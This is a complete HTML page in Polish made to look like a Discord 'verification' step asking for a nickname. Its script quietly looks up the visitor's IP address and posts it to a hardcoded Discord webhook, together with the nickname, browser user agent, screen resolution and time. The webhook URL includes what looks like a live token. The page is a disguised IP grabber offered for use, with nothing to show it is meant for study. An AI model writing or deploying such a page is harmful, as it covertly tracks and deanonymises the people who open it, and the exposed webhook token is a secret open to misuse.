<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Weryfikacja</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #202225; /* Discord Dark Theme */
            color: #ffffff;
            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .container {
            background-color: #2b2d31;
            padding: 32px;
            border-radius: 8px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            text-align: center;
            width: 320px;
        }

        h2 {
            margin-top: 0;
            margin-bottom: 24px;
            font-weight: 600;
            font-size: 20px;
        }

        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 12px;
            border: 1px solid #4f545c;
            border-radius: 4px;
            background-color: #1e1f22;
            color: #dbdee1;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #7289da;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #7289da;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        button:hover {
            background-color: #677bc4;
        }

        button:disabled {
            background-color: #4f545c;
            cursor: not-allowed;
        }

        .hidden {
            display: none !important;
        }

        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #7289da;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 12px auto;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status-msg {
            font-size: 14px;
            color: #b9bbbe;
            margin-top: 12px;
        }
    </style>
</head>
<body>

    <!-- Formularz -->
    <div class="container" id="login-form">
        <h2>Wpisz swój nick</h2>
        <input type="text" id="nickname" placeholder="Nazwa użytkownika..." autocomplete="off">
        <button id="submit-btn">Wyślij</button>
        <div class="loader" id="loader"></div>
        <div class="status-msg" id="status"></div>
    </div>

    <!-- Zawartość główna (po zalogowaniu) -->
    <div class="container hidden" id="main-content">
        <h2>Witaj!</h2>
        <p>Zostałeś zidentyfikowany.</p>
        <p>Możesz teraz kontynuować.</p>
    </div>

    <script>
        // ==========================================
        // KONFIGURACJA
        // ==========================================
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1537526699082915992/vxcvkPPnitv4UnvbHCGLbHSDNQtaA9V2bGqW9KOz4KMa_LqveU7v9j1q2XZ5RN5lpxvR";

        const loginForm = document.getElementById('login-form');
        const mainContent = document.getElementById('main-content');
        const nickInput = document.getElementById('nickname');
        const submitBtn = document.getElementById('submit-btn');
        const loader = document.getElementById('loader');
        const statusMsg = document.getElementById('status');

        // Funkcja pobierająca IP
        async function getIP() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (!response.ok) throw new Error('Network error');
                const data = await response.json();
                if (data.error) return "Nieznany IP";
                return data.ip;
            } catch (e) {
                try {
                    const resp2 = await fetch('https://api.ipify.org?format=json');
                    const data2 = await resp2.json();
                    return data2.ip;
                } catch (e2) {
                    return "Nieznany IP";
                }
            }
        }

        // Funkcja wysyłająca do Discorda
        async function sendToDiscord(nick, ip) {
            const userAgent = navigator.userAgent;
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const date = new Date().toLocaleString('pl-PL');

            const payload = {
                embeds: [{
                    title: "🔍 Nowa identyfikacja",
                    color: 4378198, // Discord Blurple
                    fields: [
                        { name: "Nick", value: nick, inline: true },
                        { name: "Adres IP", value: ip || "Błąd pobrania", inline: true },
                        { name: "Przeglądarka", value: userAgent.substring(0, 60) + "...", inline: false },
                        { name: "Rozdzielczość", value: screenRes, inline: true },
                        { name: "Data i czas", value: date, inline: false }
                    ],
                    footer: { text: "System Weryfikacji v2.0" },
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        // Obsługa zdarzeń
        async function handleSubmit() {
            const nick = nickInput.value.trim();
            if (!nick) {
                statusMsg.textContent = "Podaj nick!";
                statusMsg.style.color = "#f23f42";
                return;
            }

            // UI Loading
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.7';
            loader.style.display = 'block';
            statusMsg.textContent = "";

            try {
                // Pobierz IP
                const ip = await getIP();
                
                // Wyślij do Discorda
                await sendToDiscord(nick, ip);

                // Pokaż główną zawartość
                loginForm.classList.add('hidden');
                mainContent.classList.remove('hidden');

            } catch (error) {
                console.error(error);
                statusMsg.textContent = "Błąd połączenia. Spróbuj ponownie.";
                statusMsg.style.color = "#f23f42";
                submitBtn.disabled = false;
                loader.style.display = 'none';
            }
        }

        submitBtn.addEventListener('click', handleSubmit);
        
        nickInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') handleSubmit();
        });
    </script>
</body>
</html>
